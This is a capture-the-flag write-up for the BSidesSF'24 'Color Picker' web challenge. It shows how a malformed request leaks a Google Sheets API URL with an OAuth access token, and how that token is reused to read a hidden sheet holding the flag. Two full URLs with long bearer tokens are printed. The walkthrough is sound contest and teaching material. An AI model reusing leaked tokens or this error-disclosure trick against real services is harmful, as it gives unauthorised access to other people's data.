---
CTF: BSidesSF'24
Category: web
Points: "424"
Date: 2024-05-05
Solved?: true
---
----
[<- Home](../../)
### TL;DR

**Flag**

```
CTF{acc355-t0k3n5}
```

### Details

Description

> I wonder what color the flag is?
> Author: itsc0rg1, Mandatory
> 
> https://color-picker-5861f5ad.challenges.bsidessf.net/
> 


We get the site with shade picker

![](assets/Pasted%20image%2020240505235450.png)

There are two separate requests visible in the network tab when submitting the shade.

![](assets/Pasted%20image%2020240505235546.png)

The second one is the final destination where the picked shade will be displayed.

![](assets/Pasted%20image%2020240505235621.png)

However, there is a catch. If we send a request without `range_end`, for example

```
https://color-picker-5861f5ad.challenges.bsidessf.net/color?range_start=A2&range_end=
```

We cause visible HTTP error that gives us spreadsheet URL

![](assets/Pasted%20image%2020240506000233.png)

```
https://sheets.googleapis.com/v4/spreadsheets/18hFC6DvTZ-NtbYby7Sej0f8t8-6n0_GL7Uf25acuRk8/values/A2:?access_token=ya29.c.c0AY_VpZjp-SMc493hGrjMTJheTGExYYwWXOxZfat799nqAHHv0X-My4ktQYy4YZAhDai-HqFGP176rvU0N5OCYC21KDbFHZ0wGy_oNXp-H-ZD3Ed9iM7oc6pGQtN_dtLc9W_8g9g8GeXzaecHWyFO3sTS31QqgboH_VuoPBu4BiLr9zFTp8Lt4yC1d0x4ekPetAASMN2qy8RfuS1RiWN2zmyTt-ID5nuuYMDJrgvu91H3EDgb7ta5QMRmS27pCwl5DDn0jPMPAvEkhZeSzQid6n8cdbaBCwiq_pFU9FQQyqhe4KXk6m_6i2-cWCagoPzJyiy1FND1U9XomhEAO1xa89Qu9XYESE1SC2aJckng5tDPDr7mGSILluA7N385KWtdSS2Uc2r_40bi5WssQ1vMVghrd3Uq-BFdcrY-4x-yB7OqrRMkgiZaSujlcYau9mM2Xg6RJraF9x5ndfMvR7Sjcy1OrJvcgFQfqwjO_B10by5pB3iMnQbayS2M9zu28VbpiS0jU2ORWBYoj_iaQbRJ3bUxYY01w1Qvzg97xu_q9F2yWmOvig9UVbOifB0c52gi2Ur0IXc1YjaU-WsXf8afvWQbzFFqI3Jvm2MO4Jh12glw0dkjZjs-lJcVkqpwYYYYdu5W13xbiyM062pcnsXW7Vx9q86dyaaVoQSaSubMjgh-lyItiiUgO0x2ut1cehfJodhSRd9trBxz8uju7vJ1ZOJzduZYQ-zrSSBXZqfkBXb3Rq7bqS9sQByeU86MaUQzVhycnik8nmi46mbqd24qR0lJZ8Mp5XeJrediau9bS0QplooXWVmwgkXVlJ5U86Os6zqfs9_I2QZ1dkJb7nXF45klof8RjtjdpzMB_S55OtBdheO9WfdZxYsynW5IUjW3Yr3pMM8p2y7nMeZ4tpix5qzZhnaco7Zeqwcs8ur9dbqlwzsrZ5OzlkhXF-40xm7XRbeQ635Zkpn6u7BsI35FjzBih7oy8BJ4-BuvSUXr9ywu11tW5knrpSg
```

No we need to fix the request that we previously broke. By removing `/values/A2:?` from the it, we can obtain information about the spreadsheet.

![](assets/Pasted%20image%2020240505235854.png)

Based on it, we can find second sheet

![](assets/Pasted%20image%2020240505235910.png)

To access it, we simply need to add this to the response (after sheetid):

```
/values/Sheet2!A1:X100
```

```
https://sheets.googleapis.com/v4/spreadsheets/18hFC6DvTZ-NtbYby7Sej0f8t8-6n0_GL7Uf25acuRk8/values/Sheet2!A1:X100?access_token=ya29.c.c0AY_VpZhxjeTQbSYadAvXu9PsPy0JrQJUNHViPpZtxic8L6xsJtS6ALzBcqI5ilnK8-y9qHF8u61VrXPcjNMdlXCC8ptQMB0zCxEZ2x-m5i7amg26nBhFx8LY8AdFMKu8sLUvR4ohXzjv-EcuJ4G36C4Odyo0ptpaWoN4nLleEROAqYg6roeHhtnpDPKkWcJHuxf316qZrWE1be7A8gXeisvPOandi1obSSyO8upxjfLajwyPBaNBmeuJ37u8XcxXL6_S99ekClwode4M7fpQxbF6dk4kdXzjgNI9B5OHjtqcctl8dIUuV0lfcgFO8Q4yGsf5Rc7EVVDjQtsd1V0RDzrW4CBdIuBp0N4gPOz3kp6lzcnts7JDWKlkL385Au37UqaWizXhrU1BFb3cdRft7c6j5BveOQefhdOWU6booJZIlB4jRyynRSiZeJSSIXkoaRZ-_X8-M7uBU50shdIbR4FSkOYR72Xlgh6_U_S0yW_I8ZY_-6f1d3w4UXZcO1tqkVyBvqSRcmru2hhj7VsfvvI3uz8kX1nUVnJFS0t2Fj4jFzFB-5Bevt5v-4JjeO4bbzXFIz6aj8pgjvRmfptdscx6fUeOgJcM6ZsMkpZu9Vq5-dV5wfl3r5wMVl_QuiI6hJfxgQ7k5JxdkiZsWShoBUZc-FvSgmniSzorv-2edUIS9VfnmdS_23x7l69gjStQYrpM8Wm3nXrcZiqgj9VJkaznhUVd8JJ_p3cFW9pei6u8YJvb_Xrk_p8FBaFXq7qj-dhuo599cMM4g4Uqfd6_80j1th9c8oYUnQOJn0YOJU5mUdOJVJb6ceqiySwMYFYeyxxZ-xpi4S4BiuOMpYq4r15-zImw75c5W-oS-myttB50iquUqIMlpQitY-uvl5UsR-oMe-B4BIUcV-8bRv4iexRjO4u9V9ZcSca11B41tsZ91bpzIfMg65XueuevuheWJIs3Xvil0hZ011-yso0b3Xi1_k3uR3u7Yhh3i4-9M1uzrZFUJ1IQRa7
```

And here it is:

![](assets/Pasted%20image%2020240505235938.png)